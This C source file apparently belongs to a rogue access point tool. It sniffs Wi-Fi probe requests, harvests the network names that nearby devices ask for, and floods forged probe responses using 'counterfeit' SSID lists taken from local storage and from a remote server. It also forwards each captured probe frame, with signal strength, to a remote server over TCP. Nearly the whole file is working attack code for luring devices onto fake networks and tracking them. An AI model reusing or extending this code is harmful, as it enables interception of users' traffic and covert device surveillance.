//
// Created by longll on 18-12-8.
//

#include <printf.h>
#include "sendPacket.h"
#include "parsePacket.h"
#include "common/common.h"
#include "common/send_frame.h"
//#include "common/log.h"
#include "audit_comm.h"

//#define PARSE_DEBUG 1


static int parseSTProbereqFrame(const unsigned char* data, const int len, int index, int8_t rssi);

//????radiotap??
int parseRadiotap(const unsigned char* pData, int data_len, int8_t* rssi)
{
    int header_len = 0;
    int rt_index = 0;

    struct ieee80211_radiotap_header * rt_header =
            (struct ieee80211_radiotap_header *) pData;
    struct ieee80211_radiotap_iterator rt_iterator;

    header_len = le16_to_cpu(rt_header->it_len);
    rt_index = ieee80211_radiotap_iterator_init(&rt_iterator, rt_header, header_len);

    if (header_len > data_len) {
        printf("radiotap length exceeed packet caplen\n");
        return -1;
    }

    if (rt_index < 0) {
        printf("error: ieee80211_radiotap_iterator_init(): there are no more args in the header, or the next argument type index that is present\n");
        return -1;
    }

    while (rt_index >= 0) {
        switch(rt_index) {
            case 5:
            {
//				memcpy(rssi, &radiotap_info.rssi, sizeof(rssi));
                *rssi = (int8_t) *((int8_t *) rt_iterator.this_arg);
//				log_debug("rssi = %02X\n", *rssi);
                break;
            }

            default: break;
        }
        rt_index = ieee80211_radiotap_iterator_next(&rt_iterator);
    }

    return header_len;
}

//????ieee80211??
int IEEE80211Parser(const unsigned char* data, int len, int index, int8_t rssi)
{
#ifdef PARSE_DEBUG
    printf("parse ieee80211\n");
#endif
    unsigned char* pData = data + index;
    int data_len = len - index;

    int header_len = 0;

    struct ieee80211_hdr* fm_header =
            (struct ieee80211_hdr*) pData;

    //?¨´?????¨¤?????????¨Ē
    if ( 1 == ieee80211_is_mgmt(fm_header->frame_control) )
    {
#ifdef PARSE_DEBUG
        printf("it is a management frame\n");
#endif
        header_len = parseMgmtFrame(data, len, index, rssi);

    }else if ( 1 == ieee80211_is_ctl(fm_header->frame_control) )
    {
        //??????
        header_len = -1;
//        header_len = parseCtlFrame(pData, data_len);
    }else if ( 1 == ieee80211_is_data(fm_header->frame_control) )
    {
        header_len = -1;
//        header_len = parseDataFrame(pData, data_len);
    }else
    {
        /*
            ???????Ą§??ĄÁ??¨Ž????ĄÁ?????????????????Ąã¨š?¨¤??
            #define IEEE80211_FTYPE_MGMT		0x0000
            #define IEEE80211_FTYPE_CTL		0x0004
            #define IEEE80211_FTYPE_DATA		0x0008
            #define IEEE80211_FTYPE_EXT		0x000c
        */
//        g_stru_frameCnt.unknownFrameCnt++;
//        if (LOG_DL_RADIO)
//            printf("get error FTYPE(%d)\n",(fm_header->frame_control&cpu_to_le16(IEEE80211_FCTL_FTYPE)));
        header_len = -1;
    }

    return header_len;
}

int parseMgmtFrame(const unsigned char* data, const int len, int index, int8_t rssi)
{

    unsigned char* fm_u_char = data + index;
    int data_len = len - index;
    /*
        ??Ą¤????¨Ē??ĄÁ??¨¤????Ą¤??¨¤???¨Ē
        Association request
        Association response
        Reassociation request
        Reassociation response
        Probe request
        Probe response
        Beacon
        Announcement traffic indication message (ATIM)
        Disassociation
        Authentication
        Deauthentication
        Action
    */

#ifdef PARSE_DEBUG
    printf("parse management frame\n");
#endif
    int header_len = 0;
    struct ieee80211_hdr* fm_header = (struct ieee80211_hdr*) fm_u_char;


    /*
        ??Ą¤????¨Ē??ĄÁ??¨¤????Ą¤??¨¤???¨Ē
    */

    if(1 == ieee80211_is_probe_req(fm_header->frame_control))
    {
#ifdef PARSE_DEBUG
        printf("it is a probe request frame\n");
#endif
        //Probe request(????/???????¨Ž??)
//        header_len = parseSTProbereqFrame(fm_u_char, data_len, index);
        header_len = parseSTProbereqFrame(data, len, index, rssi);
    }
    else
    {
        header_len = -1;
    }

    return header_len;
}

char* fake_ssids[4];

char * fake_ssid_1;
char * fake_ssid_2;
char * fake_ssid_3;
char * fake_ssid_4;


extern int frame_len_3d3f;
extern int frame_len_45e1;
extern int frame_len_to_be_send;

unsigned char frame_3d3f[256];
unsigned char frame_45e1[256];
unsigned char frame_to_be_send[256];

extern int packet_size;
extern unsigned char packet[256];

unsigned char *s_mac;

extern int socket_tcp;

static int parseSTProbereqFrame(const unsigned char* data, const int len, int index, int8_t rssi)
{
//    printf("get one pr frame\n");

    /*------------------------------------------------------------------------
     * @author longll
     * add something for preserve the point of whole packet data.
     */
    unsigned char* fm_u_char = data + index;
    int data_len = len - index;


    int header_len = 0;
    int err_ssidLen = 0;
    unsigned char tmp_mac[MAC_ADDR_LEN] = {0};

    struct ieee80211_hdr * fm_header =
            (struct ieee80211_hdr *) fm_u_char;

    struct ieee80211_mgmt *mgmt = (struct ieee80211_mgmt *) fm_u_char;
    struct ieee80211_ie *ie = (struct ieee80211_ie *) mgmt->u.probe_req.variable;
    int offset = 24, is_history = 0, ssid_len = 0;
    uint8_t ssid[MAX_SSID_LEN] = {0};

    //获取历史ssid
    while(data_len - offset > FCS_LEN) {
        switch (ie->id){
            case WLAN_EID_SSID:
                ssid_len = (int)ie->len; // Convert the type of ie->len from unsigned int with 8 bits to int
                if (ssid_len > IEEE80211_MAX_SSID_LEN) return -1;
                if(ssid_len > 0){
                    memcpy(ssid, (char *) ie->data, ssid_len);
                    ssid[ssid_len] = '\0';
                    is_history = 1;
                }
                break;
            case WLAN_EID_VENDOR_SPECIFIC:
                break;
                //case CURRENT_CHANNEL:break;
        }

        offset += ie->len + 1 + 1;
        ie = (struct ieee80211_ie *) ((uint8_t *) ie  + ie->len + 1 + 1 );
    }

    int idx;
    for (idx = 0; idx < ssid_len; ) {
        if (ssid[idx] <= 0x7E && ssid[idx] >= 0x20) {
            idx++;
        } else if (ssid[idx] >= 0XE0 && ssid[idx] <= 0XEF &&
                   idx + 1 < ssid_len && ssid[idx+1] >= 0X80 && ssid[idx+1] <= 0XBF &&
                   idx + 2 < ssid_len && ssid[idx+2] >= 0X80 && ssid[idx+2] <= 0XBF) {
            idx += 3;
        } else {
            // printf("%X%X%X\ttruncated\n\n", ssid[idx], ssid[idx+1], ssid[idx+2]);
            return -1;
        }
    }



/**-----------------------------------------------------------------------------------------------
 * @author longll
 */
    //对probe request帧回复probe response帧

    // 发送服务器下发的SSID列表时，每次只发送一个周期small_period(180)的时间，然后就发送来自终端本身的和本地的ssid列表中的。
    // 当到达一个big_period(600)时，又开始发送服务器下发的，以此循环。
    static time_t last_start_send_time = 0; // seconds
//	static time_t last_send_server_ssid_time = 0;

   /* if (sk == -1 || sk == 0) {
        // do nothing
        printf("sk not ready\n");
    } else {*/
    int i, k;
    int length = 0;
    int attack_channel = 7;
    int packet_size = 256;
    unsigned char packet[packet_size];
    int send_result = 0;
    int attack_cnt = 0;

    static int index_local_ssid_list = 0; // 记录counterfeit_ssid_list的发送的下标，因为一次只能发送40个，一次肯定不能全部接受到。循环发送

//		int strat = time(NULL);


    int time_diff = time(NULL) - last_start_send_time;
    if (time_diff > 180) {
        if (time_diff > 600) {
            //重置时间
            printf("reset the last_start_send_time\n");
            last_start_send_time = time(NULL);
//				printf("reset the last_start_send_time\n");
        } else {
            // 回复by本地原本的SSID列表, 每次只发送40个
//				printf("reply with local ssid list\n");

            int count = 0;
            for (; index_local_ssid_list < counterfeit_ssid_list.length && count < 20; index_local_ssid_list++, count++) {
//                printf("send response frame with ssid = %s\n", counterfeit_ssid_list.element[index_local_ssid_list]);
                int ssid_len = strlen(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid);
                int length = 0;
                if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 0) {
                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                        PROBE_RESP_FRAME, 0, attack_channel, packet, packet_size);
                } else if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 1) {
                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
                } else if (counterfeit_ssid_list.element[index_local_ssid_list]->encrypt == 2) {
                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                        PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);

                    for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
                    {
                        if (-1 == (send_result = sendPcakage(1, packet, length))) {
//                            if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
                            printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                                   counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid,
                                   tmp_mac[0],
                                   tmp_mac[1],
                                   tmp_mac[2],
                                   tmp_mac[3],
                                   tmp_mac[4],
                                   tmp_mac[5]);
                            usleep(ATTACK_INTERVAL);
                        }
//							usleep(ATTACK_INTERVAL);
                    }

                    length = pad_packet(counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                        PROBE_RESP_FRAME, 0, attack_channel, packet, packet_size);
                }

                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
                {
                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                               counterfeit_ssid_list.element[index_local_ssid_list]->induced_ssid,
                               tmp_mac[0],
                               tmp_mac[1],
                               tmp_mac[2],
                               tmp_mac[3],
                               tmp_mac[4],
                               tmp_mac[5]);
                        usleep(ATTACK_INTERVAL);
                    }

                }

                if (index_local_ssid_list == counterfeit_ssid_list.length-1 ) {
                    index_local_ssid_list = -1;
                }

            }
        }
    } else {
        // 回复by后台发回的

//        printf("replay with server's ssid list\n");
        for (k = 0; k < ssid_list_from_server.length; k++) {

            int ssid_len = strlen(ssid_list_from_server.element[k]->induced_ssid);

            if (ssid_list_from_server.element[k]->encrypt == 2) {
                //加密方式为 未知

                //先发送加密的
//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
//								 BEACON_FRAME, 1, attack_channel, packet, packet_size);
                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);

                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
                {
                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                               ssid_list_from_server.element[k]->induced_ssid,
                               tmp_mac[0],
                               tmp_mac[1],
                               tmp_mac[2],
                               tmp_mac[3],
                               tmp_mac[4],
                               tmp_mac[5]);
                        usleep(ATTACK_INTERVAL);
                    }
//					usleep(ATTACK_INTERVAL);
                }

                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                       ssid_list_from_server.element[k]->induced_ssid,
                       tmp_mac[0],
                       tmp_mac[1],
                       tmp_mac[2],
                       tmp_mac[3],
                       tmp_mac[4],
                       tmp_mac[5]);*/

                //再发送不加密的
//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
//								 BEACON_FRAME, 0, attack_channel, packet, packet_size);
                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);

                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
                {
                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                               ssid_list_from_server.element[k]->induced_ssid,
                               tmp_mac[0],
                               tmp_mac[1],
                               tmp_mac[2],
                               tmp_mac[3],
                               tmp_mac[4],
                               tmp_mac[5]);
                        usleep(ATTACK_INTERVAL);
                    }
//					usleep(ATTACK_INTERVAL);
                }

                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                       ssid_list_from_server.element[k]->induced_ssid,
                       tmp_mac[0],
                       tmp_mac[1],
                       tmp_mac[2],
                       tmp_mac[3],
                       tmp_mac[4],
                       tmp_mac[5]);*/



            } else if (ssid_list_from_server.element[k]->encrypt == 1) {
                //加密方式为 加密
//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
//								 BEACON_FRAME, 1, attack_channel, packet, packet_size);
                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
                int attack_cnt = 0;
                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
                {
                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                               ssid_list_from_server.element[k]->induced_ssid,
                               tmp_mac[0],
                               tmp_mac[1],
                               tmp_mac[2],
                               tmp_mac[3],
                               tmp_mac[4],
                               tmp_mac[5]);
                        usleep(ATTACK_INTERVAL);
                    }
//					usleep(ATTACK_INTERVAL);
                }

                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                       ssid_list_from_server.element[k]->induced_ssid,
                       tmp_mac[0],
                       tmp_mac[1],
                       tmp_mac[2],
                       tmp_mac[3],
                       tmp_mac[4],
                       tmp_mac[5]);*/



            } else if (ssid_list_from_server.element[k]->encrypt == 0) {
                //加密方式为 不加密 free

//				length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
//								 BEACON_FRAME, 0, attack_channel, packet, packet_size);
                length = pad_packet(ssid_list_from_server.element[k]->induced_ssid, ssid_len, ap_mac, tmp_mac,
                                    PROBE_RESP_FRAME, 1, attack_channel, packet, packet_size);
                int attack_cnt = 0;
                for (attack_cnt = 0; attack_cnt < ATTACK_CNT; ++attack_cnt)
                {
                    if (-1 == (send_result = sendPcakage(1, packet, length))) {
//                        if (-1 == (send_result = sendto(sk, packet, length, 0, &sll, sizeof(struct sockaddr_ll)))) {
                        printf("send beacon frame error , ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                               ssid_list_from_server.element[k]->induced_ssid,
                               tmp_mac[0],
                               tmp_mac[1],
                               tmp_mac[2],
                               tmp_mac[3],
                               tmp_mac[4],
                               tmp_mac[5]);
                        usleep(ATTACK_INTERVAL);
                    }
//					usleep(ATTACK_INTERVAL);
                }

                /*printf("sent beacon frame, ssid = %s\n, ep_mac=%02x-%02x-%02x-%02x-%02x-%02x",
                       ssid_list_from_server.element[k]->induced_ssid,
                       tmp_mac[0],
                       tmp_mac[1],
                       tmp_mac[2],
                       tmp_mac[3],
                       tmp_mac[4],
                       tmp_mac[5]);*/

            }
        }
    }

//		printf("end send response frame , time used = %d\n", time(NULL)-strat);


//    }
//--------------------------------------------------------------------------------------------------

    /*------------------------------------------------------------------------
     * @author longll
     * add something for preserve the point of whole packet data.
     */


    //send probe request frame to server
//    if (send_frame_to_server == 3 || send_frame_to_server == 1) {

//	    printf("send frame to server\n");

        //backup data
        unsigned char dataCopy[IEEE80211_MAX_FRAME_LEN] = {0};
        memcpy(dataCopy, data, len);

//        printf("send frame to server\n");
        if (socket_tcp == -1) {
            printf("create soket failed!!");
            createSocket();
        }



//        printf("got a pr frame, going to send\n");

        int send = sendFrame(socket_tcp, PROBE_REQUEST_FRAME, len, dataCopy, rssi);
        if (send == -1) {
            printf("send error, the length of package = %d\n", len);
        }
//    }

//    printf("check ssid if is in the list\n");
    // if the ssid is not in the counterfei_list, add it
    int l = 0;
    int find = 0;
    if (is_history) {
        for (l = 0; l < counterfeit_ssid_list.length; l++) {
            int res = strcmp(counterfeit_ssid_list.element[l]->induced_ssid, ssid);
//        int res = memcpy(counterfeit_ssid_list.element[length]->induced_ssid, ssid, MAX_SSID_LEN);
            if (res == 0) {
//                printf("got a known ssid = %s\n", ssid);
                find = 1;
                break;
            }

        }

//    printf("check ssid if is in the list\n");
        if (find == 0) {

            printf("got a unknown ssid = %s, counterfeit_ssid_length = %d\n", ssid, counterfeit_ssid_list.length);

            l = counterfeit_ssid_list.length;
            if (l < INDUCE_SSID_SIZE-1) {
//                printf("add to counterfeit_ssid_list\n");
                counterfeit_ssid_list.element[l] = (counterfeit_ssid_t *)calloc(sizeof(counterfeit_ssid_t), 1);

                if(!counterfeit_ssid_list.element[l]){
                    printf("Allocate memory error!");
                } else {
                    memcpy(counterfeit_ssid_list.element[l]->induced_ssid, ssid, MAX_SSID_LEN);
                    counterfeit_ssid_list.element[l]->encrypt = 2;
                    counterfeit_ssid_list.element[l]->hit = 0;
                    counterfeit_ssid_list.element[l]->radiate = 0;
                    counterfeit_ssid_list.element[l]->radiate_time = 0;

                    counterfeit_ssid_list.length++;
                }
            }


        }
    }

//    printf("got a known ssid = %s\n", ssid);

    //------------------------------------------------------------------------

    header_len = offset;

    return header_len;
}